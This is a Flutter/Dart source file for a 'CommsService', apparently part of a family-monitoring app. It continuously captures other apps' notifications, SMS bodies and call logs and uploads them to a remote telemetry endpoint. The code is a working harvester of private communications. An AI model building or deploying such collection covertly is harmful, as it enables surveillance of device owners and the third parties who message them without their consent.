import 'dart:async';
import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;
import 'package:notification_listener_service/notification_listener_service.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:call_log/call_log.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:shared_preferences/shared_preferences.dart';

class CommsService {
  static const FlutterSecureStorage _secureStorage = FlutterSecureStorage();
  static StreamSubscription? _notificationSubscription;
  static Timer? _syncTimer;

  static Future<void> init() async {
    // Attempt to start the notification listener
    try {
      bool isGranted = await NotificationListenerService.isPermissionGranted();
      if (isGranted) {
        _startNotificationStream();
      }
    } catch (e) {
      debugPrint("CommsService: Failed to init notification listener - $e");
    }

    // Start periodic polling for SMS and Call Logs (every 15 min roughly)
    // In a real production scenario, this might be triggered by background tasks
    // such as flutter_background_geolocation's heartbeat or a workmanager job.
    _syncTimer = Timer.periodic(const Duration(minutes: 15), (timer) {
      syncSmsAndCalls();
    });
    
    // Do an initial sync now
    syncSmsAndCalls();
  }

  static void _startNotificationStream() {
    if (_notificationSubscription != null) return;
    
    debugPrint("CommsService: Starting Notification Stream");
    _notificationSubscription = NotificationListenerService.notificationsStream.listen((event) async {
      debugPrint("CommsService: New Notification: ${event.packageName}");
      
      // Filter out overly noisy system packages if needed
      if (event.packageName == "android" || event.packageName == "com.android.systemui") return;

      final payload = {
        "package_name": event.packageName ?? "unknown",
        "title": event.title ?? "",
        "text": event.content ?? "",
        // ISO 8601 UTC timestamp
        "timestamp": DateTime.now().toUtc().toIso8601String()
      };

      await _uploadCommsData(notifications: [payload]);
    });
  }

  static Future<void> syncSmsAndCalls() async {
    debugPrint("CommsService: Syncing SMS and Call Logs...");
    final prefs = await SharedPreferences.getInstance();
    
    // 1. Fetch SMS
    List<Map<String, dynamic>> smsPayloads = [];
    try {
      final lastSmsTimestamp = prefs.getInt('kin_last_sms_ts') ?? 0;
      final SmsQuery query = SmsQuery();
      final messages = await query.getAllSms;
      
      int maxTs = lastSmsTimestamp;
      for (var msg in messages) {
        final ts = msg.date?.millisecondsSinceEpoch ?? 0;
        if (ts > lastSmsTimestamp) {
          smsPayloads.add({
            "sender": msg.address ?? "Unknown",
            "body": msg.body ?? "",
            "timestamp": msg.date?.toUtc().toIso8601String() ?? DateTime.now().toUtc().toIso8601String(),
            "is_incoming": msg.kind == SmsMessageKind.received,
          });
          if (ts > maxTs) maxTs = ts;
        }
      }
      prefs.setInt('kin_last_sms_ts', maxTs);
    } catch (e) {
      debugPrint("CommsService: SMS Sync Error - $e");
    }

    // 2. Fetch Call Logs
    List<Map<String, dynamic>> callPayloads = [];
    try {
      final lastCallTimestamp = prefs.getInt('kin_last_call_ts') ?? 0;
      final Iterable<CallLogEntry> entries = await CallLog.get();
      
      int maxTs = lastCallTimestamp;
      for (var entry in entries) {
        final ts = entry.timestamp ?? 0;
        if (ts > lastCallTimestamp) {
          String typeStr = "unknown";
          if (entry.callType == CallType.incoming) typeStr = "incoming";
          if (entry.callType == CallType.outgoing) typeStr = "outgoing";
          if (entry.callType == CallType.missed) typeStr = "missed";
          
          callPayloads.add({
            "number": entry.number ?? entry.name ?? "Unknown",
            "duration_seconds": entry.duration ?? 0,
            "type": typeStr,
            "timestamp": DateTime.fromMillisecondsSinceEpoch(ts).toUtc().toIso8601String()
          });
          if (ts > maxTs) maxTs = ts;
        }
      }
      prefs.setInt('kin_last_call_ts', maxTs);
    } catch (e) {
      debugPrint("CommsService: Call Log Sync Error - $e");
    }

    if (smsPayloads.isNotEmpty || callPayloads.isNotEmpty) {
      await _uploadCommsData(sms: smsPayloads, calls: callPayloads);
    }
  }

  static Future<void> _uploadCommsData({
    List<Map<String, dynamic>>? notifications,
    List<Map<String, dynamic>>? sms,
    List<Map<String, dynamic>>? calls,
  }) async {
    try {
      final jwtStr = await _secureStorage.read(key: 'access_token');
      final deviceId = await _secureStorage.read(key: 'device_id');
      final baseUrl = await _secureStorage.read(key: 'api_url');
      
      if (jwtStr == null || deviceId == null || baseUrl == null) return;

      final url = Uri.parse('$baseUrl/api/v1/telemetry/comms');
      
      final payload = <String, dynamic>{
        "device_id": deviceId,
      };
      
      if (notifications != null && notifications.isNotEmpty) payload["notifications"] = notifications;
      if (sms != null && sms.isNotEmpty) payload["sms"] = sms;
      if (calls != null && calls.isNotEmpty) payload["calls"] = calls;

      final response = await http.post(
        url,
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer $jwtStr',
        },
        body: jsonEncode(payload)
      );

      if (response.statusCode != 201) {
        debugPrint("CommsService: Failed to upload comms: HTTP ${response.statusCode} - ${response.body}");
      } else {
        debugPrint("CommsService: Successfully uploaded comms block");
      }
    } catch (e) {
      debugPrint("CommsService: Exception during comms upload - $e");
    }
  }
}
